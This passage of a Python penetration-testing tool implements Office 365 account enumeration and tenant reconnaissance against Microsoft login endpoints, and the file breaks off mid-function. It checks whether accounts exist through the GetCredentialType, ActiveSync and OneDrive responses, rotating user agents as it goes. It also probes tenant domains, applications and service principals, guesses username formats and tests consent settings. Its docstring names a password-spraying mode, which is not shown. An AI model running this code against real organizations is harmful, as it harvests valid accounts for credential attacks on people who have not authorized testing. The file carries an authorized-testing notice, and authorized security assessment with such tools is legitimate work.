#!/usr/bin/env python3
# =============================================================================
# VAPT Toolkit - Vulnerability Assessment and Penetration Testing Toolkit
# =============================================================================
#
# Author: Keith Pachulski
# Company: Red Cell Security, LLC
# Email: keith@redcellsecurity.org
# Website: www.redcellsecurity.org
#
# Copyright (c) 2025 Keith Pachulski. All rights reserved.
#
# License: This software is licensed under the MIT License.
#          You are free to use, modify, and distribute this software
#          in accordance with the terms of the license.
#
# Purpose: This script provides an automated installation and management system
#          for a vulnerability assessment and penetration testing
#          toolkit. It installs and configures security tools across multiple
#          categories including exploitation, web testing, network scanning,
#          mobile security, cloud security, and Active Directory testing.
#
# DISCLAIMER: This software is provided "as-is," without warranty of any kind,
#             express or implied, including but not limited to the warranties
#             of merchantability, fitness for a particular purpose, and non-infringement.
#             In no event shall the authors or copyright holders be liable for any claim,
#             damages, or other liability, whether in an action of contract, tort, or otherwise,
#             arising from, out of, or in connection with the software or the use or other dealings
#             in the software.
#
# NOTICE: This toolkit is intended for authorized security testing only.
#         Users are responsible for ensuring compliance with all applicable laws
#         and regulations. Unauthorized use of these tools may violate local,
#         state, federal, and international laws.
#
# =============================================================================
"""
O365 Password Spraying and Enumeration Tool
Mimics o365spray functionality with enum, validate, and spray modes
"""

import requests
import argparse
import time
import random
import sys
import re
from typing import List, Tuple, Dict, Optional
from datetime import datetime
from pathlib import Path
import json
import getpass
import dns.resolver

class O365Enum:
    """Username enumeration via multiple O365 endpoints"""

    def __init__(self, domain: str, verbose: bool = False):
        self.domain = domain
        self.verbose = verbose
        self.session = requests.Session()
        self.valid_users = []
        self.invalid_users = []

    def _log(self, message: str, level: str = 'info'):
        """Logging with timestamps"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        prefix = {
            'info': '[*]',
            'success': '[+]',
            'error': '[-]',
            'warning': '[!]'
        }.get(level, '[*]')
        print(f"{timestamp} {prefix} {message}")

    def _random_ua(self) -> str:
        """Generate random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
        ]
        return random.choice(agents)

    def enum_office_api(self, email: str) -> Tuple[bool, str]:
        """
        Enumerate via Office.com GetCredentialType API
        Most reliable method - returns account existence
        """
        url = 'https://login.microsoftonline.com/common/GetCredentialType'

        headers = {
            'User-Agent': self._random_ua(),
            'Content-Type': 'application/json; charset=utf-8',
            'Accept': 'application/json'
        }

        data = {
            'Username': email,
            'IsOtherIdpSupported': True,
            'CheckPhones': False,
            'IsRemoteNGCSupported': True,
            'IsCookieBannerShown': False,
            'IsFidoSupported': True,
            'ForceotcLogin': False,
            'IsExternalFederationDisallowed': False,
            'IsRemoteConnectSupported': False,
            'FederationFlags': 0,
            'IsSignup': False,
            'FlowToken': None,
            'OriginalRequest': None
        }

        try:
            resp = self.session.post(url, headers=headers, json=data, timeout=30)

            if resp.status_code == 200:
                result = resp.json()

                # IfExistsResult: 0 = exists, 1 = doesn't exist, 5/6 = exists (other states)
                if_exists = result.get('IfExistsResult', 1)
                throttle_status = result.get('ThrottleStatus', 0)

                if throttle_status == 1:
                    return None, "THROTTLED"

                if if_exists == 0 or if_exists == 5 or if_exists == 6:
                    return True, "Valid account"
                else:
                    return False, "Invalid account"
            else:
                return None, f"HTTP {resp.status_code}"

        except requests.exceptions.RequestException as e:
            return None, f"Request error: {str(e)}"

    def enum_activesync(self, email: str) -> Tuple[bool, str]:
        """
        Enumerate via ActiveSync endpoint
        Fallback method when Office API is rate limited
        """
        url = 'https://outlook.office365.com/Microsoft-Server-ActiveSync'

        headers = {
            'User-Agent': self._random_ua(),
            'MS-ASProtocolVersion': '14.0'
        }

        try:
            resp = self.session.options(url, headers=headers, auth=(email, 'fake'), timeout=30)

            # 401 = valid user, 404 = invalid user
            if resp.status_code == 401:
                return True, "Valid (ActiveSync)"
            elif resp.status_code == 404:
                return False, "Invalid (ActiveSync)"
            else:
                return None, f"Unexpected response: {resp.status_code}"

        except requests.exceptions.RequestException as e:
            return None, f"Request error: {str(e)}"

    def enum_onedrive(self, username: str) -> Tuple[bool, str]:
        """
        Enumerate via OneDrive URL check
        Check if user's OneDrive exists
        """
        # Convert email to OneDrive format
        user_part = username.split('@')[0]
        domain_part = self.domain.replace('.', '_')
        onedrive_url = f'https://{domain_part}-my.sharepoint.com/personal/{user_part}_{domain_part}/_layouts/15/onedrive.aspx'

        headers = {
            'User-Agent': self._random_ua()
        }

        try:
            resp = self.session.get(onedrive_url, headers=headers, timeout=30, allow_redirects=False)

            # 302/401 = exists, 404 = doesn't exist
            if resp.status_code in [302, 401, 403]:
                return True, "Valid (OneDrive)"
            elif resp.status_code == 404:
                return False, "Invalid (OneDrive)"
            else:
                return None, f"Unexpected response: {resp.status_code}"

        except requests.exceptions.RequestException as e:
            return None, f"Request error: {str(e)}"

    def enumerate_users(self, usernames: List[str], method: str = 'office',
                       delay: int = 0, output_file: Optional[str] = None) -> Dict:
        """
        Enumerate list of usernames
        """
        self._log(f"Starting enumeration of {len(usernames)} users using {method} method")

        results = {
            'valid': [],
            'invalid': [],
            'unknown': []
        }

        for idx, username in enumerate(usernames, 1):
            # Construct full email if needed
            if '@' not in username:
                email = f"{username}@{self.domain}"
            else:
                email = username

            self._log(f"Testing {idx}/{len(usernames)}: {email}")

            # Choose enumeration method
            if method == 'office':
                valid, message = self.enum_office_api(email)
            elif method == 'activesync':
                valid, message = self.enum_activesync(email)
            elif method == 'onedrive':
                user_part = email.split('@')[0]
                valid, message = self.enum_onedrive(user_part)
            else:
                valid, message = self.enum_office_api(email)

            # Process result
            if valid is True:
                self._log(f"VALID: {email} - {message}", 'success')
                results['valid'].append(email)
                self.valid_users.append(email)
            elif valid is False:
                if self.verbose:
                    self._log(f"INVALID: {email} - {message}", 'error')
                results['invalid'].append(email)
                self.invalid_users.append(email)
            else:
                self._log(f"UNKNOWN: {email} - {message}", 'warning')
                results['unknown'].append(email)

            # Delay between requests
            if idx < len(usernames) and delay > 0:
                time.sleep(delay)

        # Save results
        if output_file:
            self._save_results(results, output_file)

        # Summary
        self._log(f"\n{'='*60}")
        self._log(f"Enumeration Complete", 'success')
        self._log(f"Valid: {len(results['valid'])}")
        self._log(f"Invalid: {len(results['invalid'])}")
        self._log(f"Unknown: {len(results['unknown'])}")
        self._log(f"{'='*60}\n")

        return results

    def _save_results(self, results: Dict, output_file: str):
        """Save enumeration results to file"""
        try:
            with open(output_file, 'w') as f:
                for email in results['valid']:
                    f.write(f"{email}\n")
            self._log(f"Valid users saved to: {output_file}", 'success')
        except Exception as e:
            self._log(f"Error saving results: {e}", 'error')

class O365DomainValidator:
    """Validate if a domain uses Office 365 and perform comprehensive tenant reconnaissance"""

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.session = requests.Session()
        self.tenant_id = None
        self.domain = None
        self.recon_data = {}

    def _log(self, message: str, level: str = 'info'):
        """Logging with timestamps"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        prefix = {
            'info': '[*]',
            'success': '[+]',
            'error': '[-]',
            'warning': '[!]'
        }.get(level, '[*]')
        print(f"{timestamp} {prefix} {message}")

    def _random_ua(self) -> str:
        """Generate random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
        ]
        return random.choice(agents)

    def check_mx_records(self, domain: str) -> Tuple[bool, List[str]]:
        """Check MX records for O365 indicators"""
        try:
            import dns.resolver
            mx_records = dns.resolver.resolve(domain, 'MX')
            mx_hosts = [str(r.exchange).lower() for r in mx_records]

            # O365 MX record patterns
            o365_patterns = [
                '.mail.protection.outlook.com',
                '.onmicrosoft.com',
                'outlook.com'
            ]

            is_o365 = any(any(pattern in mx for pattern in o365_patterns) for mx in mx_hosts)
            return is_o365, mx_hosts

        except ImportError:
            self._log("MX check skipped - dnspython not installed", 'warning')
            return None, []
        except Exception as e:
            return False, []

    def check_autodiscover(self, domain: str) -> Tuple[bool, str]:
        """Check Autodiscover endpoint for O365"""
        url = f'https://autodiscover-s.outlook.com/autodiscover/autodiscover.json/v1.0/{domain}?Protocol=Autodiscoverv1'

        try:
            resp = self.session.get(url, timeout=10, allow_redirects=True)

            if resp.status_code == 200 or 'outlook' in resp.url.lower():
                return True, "Autodiscover points to O365"
            else:
                return False, f"Autodiscover HTTP {resp.status_code}"

        except Exception as e:
            return False, f"Autodiscover error: {str(e)}"

    def check_openid_config(self, domain: str) -> Tuple[bool, str, Optional[str]]:
        """Check OpenID configuration for tenant"""
        url = f'https://login.microsoftonline.com/{domain}/.well-known/openid-configuration'

        try:
            resp = self.session.get(url, timeout=10)

            if resp.status_code == 200:
                data = resp.json()
                token_endpoint = data.get('token_endpoint', '')
                tenant_id = token_endpoint.split('/')[3] if token_endpoint else None

                # Store additional OpenID details
                self.recon_data['openid_config'] = {
                    'issuer': data.get('issuer'),
                    'authorization_endpoint': data.get('authorization_endpoint'),
                    'token_endpoint': data.get('token_endpoint'),
                    'userinfo_endpoint': data.get('userinfo_endpoint'),
                    'tenant_region_scope': data.get('tenant_region_scope'),
                    'cloud_instance_name': data.get('cloud_instance_name'),
                    'cloud_graph_host_name': data.get('cloud_graph_host_name')
                }

                return True, f"Valid O365 tenant (ID: {tenant_id})", tenant_id
            elif resp.status_code == 400:
                return False, "Domain not found in O365", None
            else:
                return False, f"HTTP {resp.status_code}", None

        except Exception as e:
            return False, f"OpenID check error: {str(e)}", None

    def check_federation(self, domain: str) -> Tuple[bool, str, Dict]:
        """Check domain federation/authentication method"""
        url = 'https://login.microsoftonline.com/common/userrealm/'

        params = {
            'user': f'user@{domain}',
            'api-version': '2.1',
            'checkForMicrosoftAccount': 'true'
        }

        try:
            resp = self.session.get(url, params=params, timeout=10)

            if resp.status_code == 200:
                data = resp.json()

                namespace_type = data.get('NameSpaceType')
                federation_brand = data.get('FederationBrandName', 'N/A')
                domain_name = data.get('DomainName', 'N/A')

                details = {
                    'namespace_type': namespace_type,
                    'federation_brand': federation_brand,
                    'domain_name': domain_name,
                    'cloud_instance': data.get('CloudInstanceName', 'N/A'),
                    'federation_protocol': data.get('FederationProtocol', 'N/A'),
                    'federation_metadata_url': data.get('FederationMetadataUrl', 'N/A')
                }

                if namespace_type == 'Managed':
                    return True, "Managed (Cloud-only authentication)", details
                elif namespace_type == 'Federated':
                    return True, f"Federated (SSO via {federation_brand})", details
                else:
                    return False, "Unknown namespace type", details
            else:
                return False, f"HTTP {resp.status_code}", {}

        except Exception as e:
            return False, f"Federation check error: {str(e)}", {}

    def get_tenant_details(self, tenant_id: str) -> Dict:
        """Get detailed tenant information using tenant ID"""
        self._log("Fetching tenant configuration details...")

        details = {}

        # Get OpenID configuration
        try:
            url = f"https://login.microsoftonline.com/{tenant_id}/v2.0/.well-known/openid-configuration"
            resp = self.session.get(url, timeout=10)

            if resp.status_code == 200:
                data = resp.json()
                details['openid_v2'] = {
                    'tenant_region_scope': data.get('tenant_region_scope'),
                    'cloud_instance_name': data.get('cloud_instance_name'),
                    'cloud_graph_host_name': data.get('cloud_graph_host_name'),
                    'msgraph_host': data.get('msgraph_host'),
                    'rbac_url': data.get('rbac_url')
                }

                if self.verbose:
                    self._log(f"  Tenant Region: {data.get('tenant_region_scope')}")
                    self._log(f"  Cloud Instance: {data.get('cloud_instance_name')}")
                    self._log(f"  Graph Host: {data.get('cloud_graph_host_name')}")
        except Exception as e:
            if self.verbose:
                self._log(f"  Error getting OpenID v2 config: {e}", 'warning')

        # Try to get tenant branding info
        try:
            url = f"https://login.microsoftonline.com/{tenant_id}/v2.0/.well-known/openid-configuration"
            resp = self.session.get(url, timeout=10)
            if resp.status_code == 200:
                details['tenant_accessible'] = True
        except:
            details['tenant_accessible'] = False

        return details

    def enumerate_tenant_domains(self, tenant_id: str, primary_domain: str) -> List[str]:
        """Enumerate domains associated with the tenant"""
        self._log("Enumerating associated domains...")

        discovered_domains = [primary_domain]

        # Common domain variations to check
        base_name = primary_domain.split('.')[0]
        tld = primary_domain.split('.')[-1]

        variations = [
            f"{base_name}.onmicrosoft.com",
            f"{base_name}-my.sharepoint.com",
            f"{base_name}.sharepoint.com",
            f"{base_name}.mail.onmicrosoft.com",
        ]

        # Check for alternative TLDs
        common_tlds = ['com', 'net', 'org', 'io', 'co', 'us', 'uk', 'ca']
        for alt_tld in common_tlds:
            if alt_tld != tld:
                variations.append(f"{base_name}.{alt_tld}")

        # Check for common subdomain patterns
        subdomain_patterns = ['mail', 'webmail', 'remote', 'owa', 'autodiscover', 'lyncdiscover']
        for sub in subdomain_patterns:
            variations.append(f"{sub}.{primary_domain}")

        valid_domains = []

        for domain in variations:
            try:
                # Quick check using GetCredentialType
                url = 'https://login.microsoftonline.com/common/GetCredentialType'
                data = {'Username': f'test@{domain}'}
                resp = self.session.post(url, json=data, timeout=5)

                if resp.status_code == 200:
                    result = resp.json()
                    if result.get('IfExistsResult') in [0, 5, 6]:
                        valid_domains.append(domain)
                        if self.verbose:
                            self._log(f"  Found: {domain}", 'success')

                time.sleep(0.5)  # Rate limiting

            except Exception as e:
                if self.verbose:
                    self._log(f"  Error checking {domain}: {e}", 'warning')

        if valid_domains:
            self._log(f"Discovered {len(valid_domains)} associated domains", 'success')

        return valid_domains

    def enumerate_applications(self, tenant_id: str) -> Dict:
        """Enumerate registered applications dynamically via multiple discovery methods"""
        self._log("Enumerating registered applications...")

        accessible_apps = []

        # Method 1: Seed with minimal common Microsoft apps (just to bootstrap)
        self._log("Testing core Microsoft applications...")
        seed_apps = {
            '1b730954-1685-4b74-9bfd-dac224a7b894': 'Azure AD PowerShell',
            '04b07795-8ddb-461a-bbee-02f9e1bf7b46': 'Azure CLI',
            '00000003-0000-0000-c000-000000000000': 'Microsoft Graph'
        }

        for app_id, app_name in seed_apps.items():
            if self._test_app_access(tenant_id, app_id):
                accessible_apps.append({
                    'client_id': app_id,
                    'name': app_name,
                    'accessible': True,
                    'discovery_method': 'known_seed'
                })
                if self.verbose:
                    self._log(f"  {app_name} ({app_id})", 'success')
            time.sleep(0.3)

        # Method 2: Discover applications via OpenID metadata
        self._log("Analyzing OpenID metadata...")
        discovered = self._discover_apps_via_openid(tenant_id)
        accessible_apps.extend(discovered)

        # Method 3: Probe for service principals via well-known resource URIs
        self._log("Probing well-known Azure/O365 resource URIs...")
        resource_apps = self._discover_apps_via_resources(tenant_id)
        accessible_apps.extend(resource_apps)

        # Method 4: Discover via service principal enumeration
        self._log("Enumerating service principals...")
        service_principals = self._discover_service_principals(tenant_id)
        accessible_apps.extend(service_principals)

        # Method 5: Check for custom applications
        self._log("Checking for custom applications...")
        custom_apps = self._enumerate_custom_apps(tenant_id)

        results = {
            'known_apps': [app for app in accessible_apps if app.get('discovery_method') != 'custom'],
            'custom_apps': custom_apps,
            'total_accessible': len(accessible_apps) + len(custom_apps),
            'discovery_methods_used': list(set([app.get('discovery_method', 'unknown') for app in accessible_apps]))
        }

        self._log(f"Found {results['total_accessible']} accessible applications", 'success')

        return results

    def _test_app_access(self, tenant_id: str, client_id: str) -> bool:
        """Test if an application is accessible in this tenant"""
        try:
            url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/authorize"
            params = {
                'client_id': client_id,
                'response_type': 'code',
                'redirect_uri': 'https://localhost',
                'scope': 'openid',
                'state': 'test'
            }

            resp = self.session.get(url, params=params, allow_redirects=False, timeout=5)

            # If we get a redirect to login, the app is accessible
            if resp.status_code in [200, 302]:
                location = resp.headers.get('Location', '')
                if 'login.microsoftonline.com' in location or resp.status_code == 200:
                    return True

            return False

        except Exception as e:
            if self.verbose:
                self._log(f"  Error testing app {client_id}: {e}", 'warning')
            return False

    def _discover_apps_via_openid(self, tenant_id: str) -> List[Dict]:
        """Discover applications via OpenID Connect discovery"""
        discovered = []

        try:
            # Get OpenID configuration
            url = f"https://login.microsoftonline.com/{tenant_id}/v2.0/.well-known/openid-configuration"
            resp = self.session.get(url, timeout=10)

            if resp.status_code == 200:
                config = resp.json()

                # Extract valuable information
                endpoints = {
                    'authorization_endpoint': config.get('authorization_endpoint'),
                    'token_endpoint': config.get('token_endpoint'),
                    'userinfo_endpoint': config.get('userinfo_endpoint'),
                    'end_session_endpoint': config.get('end_session_endpoint'),
                    'jwks_uri': config.get('jwks_uri')
                }

                # Get supported features
                features = {
                    'grant_types_supported': config.get('grant_types_supported', []),
                    'response_types_supported': config.get('response_types_supported', []),
                    'scopes_supported': config.get('scopes_supported', []),
                    'claims_supported': config.get('claims_supported', [])
                }

                if self.verbose:
                    self._log(f"  Supported grant types: {', '.join(features['grant_types_supported'][:5])}")
                    if len(features['scopes_supported']) > 0:
                        self._log(f"  Supported scopes: {', '.join(features['scopes_supported'][:5])}")

                discovered.append({
                    'type': 'oauth_endpoints',
                    'name': 'OAuth2/OIDC Configuration',
                    'accessible': True,
                    'discovery_method': 'openid_discovery',
                    'endpoints': endpoints,
                    'features': features
                })

        except Exception as e:
            if self.verbose:
                self._log(f"  Error in OpenID discovery: {e}", 'warning')

        return discovered

    def _discover_apps_via_resources(self, tenant_id: str) -> List[Dict]:
        """Discover applications by probing well-known resource URIs"""
        discovered = []

        # Well-known resource URIs that indicate available services
        resources = {
            'https://graph.microsoft.com': 'Microsoft Graph API',
            'https://graph.windows.net': 'Azure AD Graph API',
            'https://management.azure.com': 'Azure Resource Manager',
            'https://vault.azure.net': 'Azure Key Vault',
            'https://storage.azure.com': 'Azure Storage',
            'https://database.windows.net': 'Azure SQL Database',
            'https://outlook.office365.com': 'Exchange Online',
            'https://manage.office.com': 'Office 365 Management API',
            'https://api.powerbi.com': 'Power BI Service',
            'https://analysis.windows.net/powerbi/api': 'Power BI Embedded',
            'https://api.spaces.skype.com': 'Microsoft Teams',
            'https://outlook.office.com': 'Outlook REST API',
            'https://substrate.office.com': 'Office Substrate',
            'https://service.powerapps.com': 'Power Apps',
            'https://service.flow.microsoft.com': 'Power Automate'
        }

        for resource_uri, resource_name in resources.items():
            try:
                # Try to get token endpoint response for this resource
                url = f'https://login.microsoftonline.com/{tenant_id}/oauth2/token'

                data = {
                    'resource': resource_uri,
                    'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',  # Azure AD PowerShell
                    'grant_type': 'password',
                    'username': f'test@{self.domain}',
                    'password': 'InvalidPassword123!'
                }

                resp = self.session.post(url, data=data, timeout=5)

                # Analyze response even with invalid credentials
                if resp.status_code in [400, 401]:
                    try:
                        error = resp.json()
                        error_code = error.get('error', '')
                        error_desc = error.get('error_description', '')

                        # Different errors indicate different states
                        if 'AADSTS50001' in error_desc:
                            # Application not found - resource not available
                            continue
                        elif 'AADSTS65001' in error_desc:
                            # Consent required - service exists but needs admin consent
                            discovered.append({
                                'name': resource_name,
                                'resource_uri': resource_uri,
                                'accessible': True,
                                'discovery_method': 'resource_probe',
                                'status': 'requires_consent'
                            })
                            if self.verbose:
                                self._log(f"  {resource_name} (consent required)", 'success')
                        elif 'AADSTS50126' in error_desc or 'AADSTS70001' in error_desc:
                            # Invalid credentials but resource exists
                            discovered.append({
                                'name': resource_name,
                                'resource_uri': resource_uri,
                                'accessible': True,
                                'discovery_method': 'resource_probe',
                                'status': 'available'
                            })
                            if self.verbose:
                                self._log(f"  {resource_name}", 'success')
                        else:
                            # Other error but resource appears valid
                            discovered.append({
                                'name': resource_name,
                                'resource_uri': resource_uri,
                                'accessible': True,
                                'discovery_method': 'resource_probe',
                                'status': 'unknown',
                                'error_code': error_code
                            })
                    except:
                        pass

                time.sleep(0.3)

            except Exception as e:
                if self.verbose:
                    self._log(f"  Error probing {resource_name}: {e}", 'warning')

        return discovered

    def _discover_service_principals(self, tenant_id: str) -> List[Dict]:
        """Attempt to discover service principals via various methods"""
        discovered = []

        # Method: Try common service principal patterns
        # Microsoft service principals often follow patterns
        service_patterns = [
            ('00000002-0000-0ff1-ce00-000000000000', 'Office 365 Exchange Online'),
            ('00000003-0000-0ff1-ce00-000000000000', 'Office 365 SharePoint Online'),
            ('00000006-0000-0ff1-ce00-000000000000', 'Microsoft Office 365 Portal'),
            ('00000007-0000-0000-c000-000000000000', 'Microsoft Dynamics CRM'),
            ('00000009-0000-0000-c000-000000000000', 'Power BI Service'),
            ('0000000c-0000-0000-c000-000000000000', 'Microsoft App Access Panel'),
            ('c5393580-f805-4401-95e8-94b7a6ef2fc2', 'Office 365 Management APIs'),
            ('fc780465-2017-40d4-a0c5-307022471b92', 'Microsoft Teams Services'),
            ('5e3ce6c0-2b1f-4285-8d4b-75ee78787346', 'Microsoft Teams'),
            ('cc15fd57-2c6c-4117-a88c-83b1d56b4bbe', 'Microsoft Teams Web Client'),
            ('1fec8e78-bce4-4aaf-ab1b-5451cc387264', 'Teams Admin Agent'),
            ('ab9b8c07-8f02-4f72-87fa-80105867a763', 'OneDrive Sync Engine'),
            ('d3590ed6-52b3-4102-aeff-aad2292ab01c', 'Microsoft Office'),
            ('c44b4083-3bb0-49c1-b47d-974e53cbdf3c', 'Azure Portal'),
            ('872cd9fa-d31f-45e0-9eab-6e460a02d1f1', 'Visual Studio'),
            ('1950a258-227b-4e31-a9cf-717495945fc2', 'Microsoft Azure PowerShell'),
            ('27922004-5251-4030-b22d-91ecd9a37ea4', 'Outlook Mobile')
        ]

        for app_id, app_name in service_patterns:
            try:
                if self._test_app_access(tenant_id, app_id):
                    discovered.append({
                        'client_id': app_id,
                        'name': app_name,
                        'accessible': True,
                        'discovery_method': 'service_principal_probe'
                    })
                    if self.verbose:
                        self._log(f"  {app_name}", 'success')

                time.sleep(0.2)

            except Exception as e:
                if self.verbose:
                    self._log(f"  Error testing {app_name}: {e}", 'warning')

        return discovered

    def _enumerate_custom_apps(self, tenant_id: str) -> List[Dict]:
        """Attempt to discover custom registered applications"""
        custom_apps = []

        # Note: Without authentication, we can't directly enumerate custom apps
        # But we can check for common patterns

        if self.domain:
            base_name = self.domain.split('.')[0]

            # Common application naming patterns
            app_name_patterns = [
                base_name,
                f"{base_name}-app",
                f"{base_name}-api",
                f"{base_name}-web",
                f"{base_name}-mobile",
                f"{base_name}-portal",
                f"{base_name}app",
                f"{base_name}api"
            ]

            # Common OAuth redirect URI patterns
            for app_pattern in app_name_patterns[:5]:  # Limit to avoid too many requests
                redirect_patterns = [
                    f"https://{app_pattern}.{self.domain}",
                    f"https://{app_pattern}.azurewebsites.net",
                    f"https://{self.domain}/{app_pattern}",
                    f"https://app.{self.domain}",
                    f"https://api.{self.domain}",
                    f"https://portal.{self.domain}"
                ]

                for redirect_uri in redirect_patterns:
                    try:
                        # Quick HEAD request to see if endpoint exists
                        resp = self.session.head(redirect_uri, timeout=3, allow_redirects=True)

                        if resp.status_code in [200, 302, 401, 403]:
                            # Endpoint exists - might be a custom app
                            custom_apps.append({
                                'potential_redirect_uri': redirect_uri,
                                'status': 'exists',
                                'http_code': resp.status_code,
                                'note': 'Potential OAuth redirect endpoint'
                            })
                            if self.verbose:
                                self._log(f"  Potential custom app: {redirect_uri}", 'info')

                            # Don't spam - found one, move on
                            break

                    except:
                        pass

                    time.sleep(0.2)

        return custom_apps

    def discover_username_format(self, domain: str, test_names: List[Tuple[str, str]] = None) -> Dict:
        """Discover username format conventions"""
        self._log("Discovering username format patterns...")

        if not test_names:
            # Use common test names
            test_names = [
                ('John', 'Smith'),
                ('Jane', 'Doe'),
                ('Michael', 'Johnson'),
                ('Sarah', 'Williams')
            ]
            self._log("Using default test names for pattern discovery", 'info')

        patterns = {}

        for first, last in test_names:
            first_lower = first.lower()
            last_lower = last.lower()

            # Generate common patterns
            username_patterns = {
                'firstname.lastname': f"{first_lower}.{last_lower}",
                'firstnamelastname': f"{first_lower}{last_lower}",
                'flastname': f"{first_lower[0]}{last_lower}",
                'firstnamel': f"{first_lower}{last_lower[0]}",
                'lastname.firstname': f"{last_lower}.{first_lower}",
                'lastnamef': f"{last_lower}{first_lower[0]}",
                'firstname_lastname': f"{first_lower}_{last_lower}",
                'f.lastname': f"{first_lower[0]}.{last_lower}",
                'firstname': first_lower,
                'lastname': last_lower
            }

            for pattern_name, username in username_patterns.items():
                if pattern_name not in patterns:
                    patterns[pattern_name] = {'attempts': 0, 'exists': 0}

                patterns[pattern_name]['attempts'] += 1
                email = f"{username}@{domain}"

                try:
                    url = 'https://login.microsoftonline.com/common/GetCredentialType'
                    data = {'Username': email}
                    resp = self.session.post(url, json=data, timeout=5)

                    if resp.status_code == 200:
                        result = resp.json()
                        if result.get('IfExistsResult') == 0:
                            patterns[pattern_name]['exists'] += 1
                            if self.verbose:
                                self._log(f"  Found valid pattern: {pattern_name} ({email})", 'success')

                    time.sleep(0.3)  # Rate limiting

                except Exception as e:
                    if self.verbose:
                        self._log(f"  Error testing {email}: {e}", 'warning')

        # Calculate confidence scores
        likely_patterns = []
        for pattern_name, stats in patterns.items():
            if stats['exists'] > 0:
                confidence = (stats['exists'] / stats['attempts']) * 100
                likely_patterns.append({
                    'pattern': pattern_name,
                    'matches': stats['exists'],
                    'attempts': stats['attempts'],
                    'confidence': round(confidence, 2)
                })

        # Sort by confidence
        likely_patterns.sort(key=lambda x: x['confidence'], reverse=True)

        if likely_patterns:
            self._log(f"Identified {len(likely_patterns)} valid username patterns", 'success')
            for p in likely_patterns[:3]:  # Show top 3
                self._log(f"  {p['pattern']}: {p['confidence']}% confidence ({p['matches']}/{p['attempts']} matches)")
        else:
            self._log("No valid username patterns discovered with test names", 'warning')

        return {
            'patterns': likely_patterns,
            'test_names_used': len(test_names)
        }

    def check_guest_access(self, tenant_id: str, domain: str) -> Dict:
        """Check for guest user access and misconfigurations"""
        self._log("Checking guest access configuration...")

        results = {
            'guest_users_allowed': False,
            'external_domains_found': [],
            'oauth_misconfigurations': []
        }

        # Check if external/guest users can be validated
        external_test_domains = ['gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com']

        for ext_domain in external_test_domains:
            test_email = f"test@{ext_domain}"

            try:
                url = 'https://login.microsoftonline.com/common/GetCredentialType'
                data = {'Username': test_email}
                resp = self.session.post(url, json=data, timeout=5)

                if resp.status_code == 200:
                    result = resp.json()
                    # Check if this external account could be a guest
                    if result.get('IfExistsResult') == 0:
                        results['external_domains_found'].append(ext_domain)
                        if self.verbose:
                            self._log(f"  External domain accessible: {ext_domain}", 'info')

                time.sleep(0.3)

            except Exception as e:
                if self.verbose:
                    self._log(f"  Error checking {ext_domain}: {e}", 'warning')

        if results['external_domains_found']:
            results['guest_users_allowed'] = True
            self._log(f"Guest users may be enabled (found {len(results['external_domains_found'])} external domains)", 'warning')

        # Check for OAuth app consent misconfigurations
        self._log("Checking for OAuth consent misconfigurations...")

        # Test if user consent is allowed for apps
        try:
            # Try to initiate OAuth with a test app
            url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/authorize"
            params = {
                'client_id': '00000003-0000-0000-c000-000000000000',  # Microsoft Graph
                'response_type': 'code',
                'redirect_uri': 'https://localhost',
                'scope': 'User.Read',
                'state': 'test'
            }

            resp = self.session.get(url, params=params, allow_redirects=False, timeout=5)

            # Analyze response for consent requirements
            if resp.status_code == 302:
                location = resp.headers.get('Location', '')
                if 'consent' in location.lower():
                    results['oauth_misconfigurations'].append({
                        'type': 'user_consent_allowed',
                        'description': 'Users may be able to consent to applications',
                        'risk': 'medium'
                    })
                    if self.verbose:
                        self._log("  User consent to apps may be enabled", 'warning')

        except Exception as e:
            if self.verbose:
                self._log(f"  Error checking OAuth consent: {e}", 'warning')

        # Check for admin consent requirements
        try:
            # Test with higher privilege scope
            url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/authorize"
            params = {
                'client_id': '00000003-0000-0000-c000-000000000000',
                'response_type': 'code',
                'redirect_uri': 'https://localhost',
                'scope': 'Directory.Read.All',  # Requires admin consent
                'state': 'test'
            }

            resp = self.session.get(url, params=params, allow_redirects=False, timeout=5)

        except Exception as e:
            pass

        if results['oauth_misconfigurations']:
            self._log(f"Found {len(results['oauth_misconfigurations'])} potential OAuth misconfigurations", 'warning')

        return results

    def validate_domain(self, domain: str) -> Dict:
            """Comprehensive domain validation with full reconnaissance including password policy"""
            self.domain = domain
            self._log(f"Validating domain: {domain}")
            self._log("="*60)

            results = {
                'domain': domain,
                'is_o365': False,
                'tenant_id': None,
                'checks': {},
                'reconnaissance': {},
                'password_policy': {}
            }

            # Check 1: OpenID Configuration (gets tenant ID)
            self._log("Checking OpenID configuration...")
            openid_valid, openid_msg, tenant_id = self.check_openid_config(domain)
            results['checks']['openid'] = {
                'valid': openid_valid,
                'message': openid_msg
            }

            if openid_valid and tenant_id:
